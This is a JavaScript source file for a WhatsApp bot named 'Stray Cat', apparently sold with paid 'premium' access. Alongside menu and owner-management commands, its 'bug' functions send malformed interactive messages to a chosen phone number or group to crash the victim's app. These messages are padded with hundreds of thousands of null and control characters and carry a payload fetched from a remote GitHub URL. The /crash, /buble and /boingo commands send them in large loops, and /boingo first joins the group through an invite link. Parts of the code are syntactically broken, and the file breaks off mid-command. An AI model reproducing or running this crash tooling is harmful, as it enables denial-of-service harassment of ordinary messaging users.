/*
Developer Info :
YT : https://Youtube.com/@YuukeyMiAyam
TT : https://tiktok.com/@yuukeyoffc
WA : wa.me/6285943212106
Jangan Hapus Wm Yah Sayangku❤
*/
require('../config/settings');
const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");
 
module.exports = Yuukey = async (Yuukey, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? Yuukey.user.id.split(":")[0] || Yuukey.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';

// Buat Grup
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database And Lain"
const botNumber = await Yuukey.decodeJid(Yuukey.user.id);
const isBot = botNumber.includes(senderNumber)
const newOwner = JSON.parse(fs.readFileSync("./lib/Database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./lib/Database/premium.json"))
const isPremium = premium.includes(m.sender)
const isOwner = newOwner.includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// function Group
const groupMetadata = isGroup ? await Yuukey.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
sleep } = require('../lib/myfunc');

// fungsi waktu real time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Cmd in Console
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#00FF00").bold(`=> Ada Pesan Baru Nih Dari :`));
console.log(
chalk.bgHex("#e74c3c").black(
` ╭─ > Tanggal: ${new Date().toLocaleString()} \n` +
` ├─ > Pesan: ${m.body || m.mtype} \n` +
` ├─ > Pengirim: ${m.pushname} \n` +
` ╰─ > JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#e74c3c").black(
` ╭─ > Grup: ${groupName} \n` +
` ╰─ > GroupJid: ${m.chat}`
)
);
}
console.log();
} 
//FUNCT BUG
async function Force(target) {
    console.log(`[PROSES] ${target}`);

let YuukeyRajaSuki;
try {
  const res = await fetch('https://raw.githubusercontent.com/tenka-san/Api-Buk/refs/heads/main/ApiBugYuukey.json');
  YuukeyRajaSuki = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `Stray Cat`,
                    contentType: 3,
                    accessibilityText: `Yuukey Is Coming`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: [target],
                    },
                    body: {
                        text: "Yuukey Is Coming" + "\u0000".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
{  name: "single_select",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: YuukeyRajaSuki + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "review_order",
buttonParamsJson: "" }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await Yuukey.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCES SEND FORCLOSE UI] ${target}`);
}

async function ApiFC(isTarget) {
if (!isTarget.includes("@s.whatsapp.net") && !isTarget.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", isTarget);
return;
}

let apiGrup;
try {
  const res = await fetch('https://raw.githubusercontent.com/tenka-san/Api-Buk/refs/heads/main/ApiBugYuukey.json');
  apiGrup = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

let Msg = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [isTarget],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: isTarget,
},
},
body: {
text: "Yuukey Is Coming",
},
nativeFlowMessage: {
buttons: [
{  name: "single_select",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "☠️𝐈\'𝐚𝐦 𝐘𝐮𝐮𝐤𝐞𝐲☠️",
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
}, 
{
name: "payment_method",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "review_order",
buttonParamsJson: "" }
],
},
},
},
},
};
for (let i = 0; i < 10; i++) {  
try {
await Yuukey.relayMessage(isTarget, Msg, {});
await new Promise(resolve => setTimeout(resolve, 0));
} catch (err) {
console.error("Error mengirim bug:", err);
break; 
}
}
}

async function GalaxyCrash(target) {
try {
let yuki = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [ target ],
isForwarded: true,
forwadingScore: 1,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},
body: {
text: "Yuukey Suki",
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: "",
},
{
name: "call_permission_request",
buttonParamsJson: "voice_call": "call_galaxy",
},
{
name: "galaxy_custom",
buttonParamsJson: "",
},
{
name: "galaxy_message", buttonParamsJson: JSON.stringify({
"screen_1_TextInput_0": "radio - buttons" + "\u2025".repeat(10000), "screen_0_Dropdown_1": "Null",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}),
version: 3
},
],
},
},
},
},
},
};

await client.relayMessage(target, yuki, {
participant: {
jid:target
},
});
} catch (err) {
console.log(err);
}
}

async function FC(target) {
for (let i = 0; i < 50; i++) {
await Force(target);
await ApiFC(target);
await GalaxyCrash(target);
console.log(`[√] Success Force Close ${target}`);
}
}

async function Group(target) {
for (let i = 0; i < 50; i++) {
await ApiFC(target);
console.log(`[ √ ]Success Bug Group`);
}
}
//END
        // Random Emoji //
        
const Moji1 = '🌸'
const Moji2 = '🍁'
const Moji3 = '🍃'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]

        // Thumb Botz //

const thumb = fs.readFileSync('./lib/Image/thumb.jpg');

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('./Start/case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Salah Blok Yang Bener Gini ${prefix+mean}`
Yuukey.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: m})
}}

const lampuwarna = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `¿Yuukey?`
}
}
}

const sound = { 
key: {
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const hw = {
  key: {
    participant: '18002428478@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `𝐘𝐮𝐮𝐤𝐞𝐲 𝐑𝐚𝐣𝐚 𝐈𝐛𝐥𝐢𝐬`,
      jpegThumbnail: ""
    }
  }, 
quoted: sound
} 

const loli = {
  key: {
    fromMe: false,
    participant: "18002428478@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: thumb,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `You Think Can Stop me?\nDon\'t forget,\nI\'am Yuukey`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const reply = (teks) => { 
Yuukey.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐊𝐢𝐫𝐚 𝐘𝐨𝐬𝐡𝐢𝐤𝐚𝐠𝐞`,"body": `Youtube.com`, "previewType": "PHOTO","thumbnailUrl": `https://Youtube.com/@YuukeyMiAyam`}}}, { quoted: loli})} 

const reaction = async (jidss, emoji) => {
Yuukey.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

switch (command) {

case 'menu': {
const menu = `
┏═━═ 『 Stray | Cat 』
║➬ Name Bot : Stray Cat
║➬ Version : 1.0.0
║➬ Developer : Yuukey
╚━═━═━═━═━═━═━═━═━═━
Pilih Tombol Di Bawah Untuk Melanjutkan
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ''
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/jzxhwu.jpg' } }, { upload: Yuukey.waUploadToServer })),
title: `\`Stray Cat\``,
gifPlayback: true,
subtitle: `YuukeySigma`,
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Thanks To","id":"/tqto"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Bug Menu","id":"/bugmenu"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Owner Menu","id":"/ownermenu"}`
},
{
"name": "cta_url",
"buttonParamsJson": JSON.stringify({
"display_text": "Dev Channel",
"url": "https://whatsapp.com/channel/0029VbAOtN72v1IzwZLVKf2u/1434",
"merchant_url": "https://whatsapp.com/channel/0029VbAOtN72v1IzwZLVKf2u/1434",
})
}
]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await Yuukey.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "owner": {
const owner = `Ini Adalah Contact Owner Saya, Jika Anda Ingin Membeli Salah Satu Produk Dari Dia Silahkan Chatt Nomor Di Bawah`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ''
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/jzxhwu.jpg' } }, { upload: Yuukey.waUploadToServer })),
title: `\`Stray Cat\``,
gifPlayback: true,
subtitle: `YuukeySigma`,
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "cta_url",
"buttonParamsJson": JSON.stringify({
"display_text": "Dev Contact",
"url": "https://t.me/YuukeySikma",
"merchant_url": "https://t.me/YuukeySikma",
})
},
{
"name": "cta_url",
"buttonParamsJson": JSON.stringify({
"display_text": "Dev Youtube",
"url": "https://Youtube.com/@YuukeyMiAyam",
"merchant_url": "https://YuukeyMiAyam",
})
},
{
"name": "cta_url",
"buttonParamsJson": JSON.stringify({
"display_text": "Dev Channel",
"url": "https://whatsapp.com/channel/0029VbAOtN72v1IzwZLVKf2u/1434",
"merchant_url": "https://whatsapp.com/channel/0029VbAOtN72v1IzwZLVKf2u/1434",
})
}
]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await Yuukey.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "public": { 
if (!isBot && !isOwner) return reply(`\`Fitur Ini Hanya Dapat Diakses Oleh Owner Bot\``)
Yuukey.public = true
reply(`*\`Successfully Changed Bot Mode To Public\`*`)
}
break

case "self": { 
if (!isBot && !isOwner) return reply(`\`Fitur Ini Hanya Dapat Diakses Oleh Owner Bot\``)
Yuukey.public = false
reply(`*\`Successfully Changed Bot Mode To Self/Private\`*`)
}
break

case "addowner":{
if (!isBot && !isOwner) return reply(`\`Fitur Khusus Yuukey\``)
if (!args[0]) return reply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××*_`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Yuukey.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*\`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!\`*`)
newOwner.push(prrkek)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(newOwner))
reply(`*\`Nomor ${prrkek} Telah Menjadi Owner Bot!!\`*`)
}
break

case "delowner":{
if (!isBot && !isOwner) return reply(`\`Fitur Khusus Yuukey\``)
if (!args[0]) return reply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××*_`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = newOwner.indexOf(ya)
newOwner.splice(unp, 1)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(newOwner))
reply(`*\`Nomor ${ya} Telah Di Hapus Dari Database Owner Bot!\`*`)
}    
break

case "addprem":{
if (!isBot && !isOwner) return reply("Fitur Khusus Yuukey")
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Yuukey.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync("./lib/Database/premium.json", JSON.stringify(premium))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isBot && !isOwner) return reply("Fitur Khusus Yuukey")
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync("./lib/Database/premium.json", JSON.stringify(premium))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case 'ownermenu': {
const teks = `
┏═━═ 『 Stray | Cat 』
║➬ Name Bot : Stray Cat
║➬ Version : 1.0.0
║➬ Developer : Yuukey
╚━═━═━═━═━═━═━═━═━═━
===========[ List | menu ]===========
-> /addprem
-> /delprem
-> /addowner
-> /delowner
-> /public
-> /self
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ''
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/jzxhwu.jpg' } }, { upload: Yuukey.waUploadToServer })),
title: `\`Stray Cat\``,
gifPlayback: true,
subtitle: `YuukeySigma`,
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Thanks To","id":"/tqto"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Bug Menu","id":"/bugmenu"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Owner Menu","id":"/ownermenu"}`
},
{
"name": "cta_url",
"buttonParamsJson": JSON.stringify({
"display_text": "Dev Channel",
"url": "https://whatsapp.com/channel/0029VbAOtN72v1IzwZLVKf2u/1434",
"merchant_url": "https://whatsapp.com/channel/0029VbAOtN72v1IzwZLVKf2u/1434",
})
}
]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await Yuukey.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'tqto': {
const tq = `
┏━❐ ༺ Thanks | To ༻
┃→ Yuukey [ Me ]
┃→ Faxz [ Best Support ]
┃→ Nted [ Ini Dev ]
┃→ Rexz [ Apprentice Killer Queen ]
┃→ Qii [ Editor :v ]
┗━━━━━━━━━━━━━━
Yang Rename Nih Sc Jangan Apus Nama W Panteq\n© Yuukey
`
await Yuukey.sendMessage(m.chat, { image: thumb, caption:tq })
}
break

case 'bugmenu': {
const bak = `
┏═━═ 『 Stray | Cat 』
║➬ Name Bot : Stray Cat
║➬ Version : 1.0.0
║➬ Developer : Yuukey
╚━═━═━═━═━═━═━═━═━═━
┏═━═ [ Bug Menu ]
║➬ /crash [ Number ]
║➬ /buble [ Number ]
║➬ /boingo [ https://chat.whatsap.com/ ]
╚━═━═━═━═━═━═━═━═━═━
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: bak
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ''
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/jzxhwu.jpg' } }, { upload: Yuukey.waUploadToServer })),
title: `\`Stray Cat\``,
gifPlayback: true,
subtitle: `YuukeySigma`,
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Thanks To","id":"/tqto"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Bug Menu","id":"/bugmenu"}`
},
{
"name": "quick_reply",
"buttonParamsJson": `{"display_text":"Owner Menu","id":"/ownermenu"}`
},
{
"name": "cta_url",
"buttonParamsJson": JSON.stringify({
"display_text": "Dev Channel",
"url": "https://whatsapp.com/channel/0029VbAOtN72v1IzwZLVKf2u/1434",
"merchant_url": "https://whatsapp.com/channel/0029VbAOtN72v1IzwZLVKf2u/1434",
})
}
]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await Yuukey.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break


case "boingo": 
{
if (!isPremium) return reply("𝐎𝐧𝐥𝐲 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝");
if (!q) return reply(`Example: \n${prefix + command} https://chat.whatsapp.com/`
);
await sleep(1000);
reply(`Bot successfully sends a virus message`
)
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await Yuukey.groupAcceptInvite(result);
for (let i = 0; i < 70000; i++) {
await Group(target);
}
reply(`𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 𝐆𝐫𝐨𝐮𝐩`)
}
break

case 'crash': {
if (!isPremium) return reply('𝐎𝐧𝐥𝐲 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐅𝐢𝐭𝐮𝐫𝐞')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐏𝐫𝐨𝐬𝐬𝐞𝐬𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 ${pepec}\n𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐒𝐞𝐜𝐨𝐧𝐝`)
await FC(target);
reply(`> 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 : ${pepec}\n> 𝐔𝐬𝐢𝐧𝐠 : ${prefix + command}\n> 𝐒𝐭𝐚𝐭𝐮𝐬 𝐓𝐚𝐫𝐠𝐞𝐭 : 𝐆𝐚𝐛𝐢𝐬𝐚 𝐍𝐠𝐞𝐜𝐡𝐚𝐭𝐭💣\n> 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐨𝐧𝐭 𝐔𝐬𝐞 𝐁𝐮𝐠 𝐅𝐨𝐫 𝟏𝟎 𝐌𝐢𝐧𝐮𝐭𝐞 `)
Yuukey.sendMessage(from, {react: {text: "💥", key: m.key}})
}
break

case 'buble': {
if (!isPremium) return reply('𝐎𝐧𝐥𝐲 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐂𝐚𝐧 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐅𝐢𝐭𝐮𝐫𝐞')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
m.reply(`𝐏𝐫𝐨𝐬𝐬𝐞𝐬𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 ${pepec}\n𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐒𝐞𝐜𝐨𝐧𝐝`)
await FC(target);
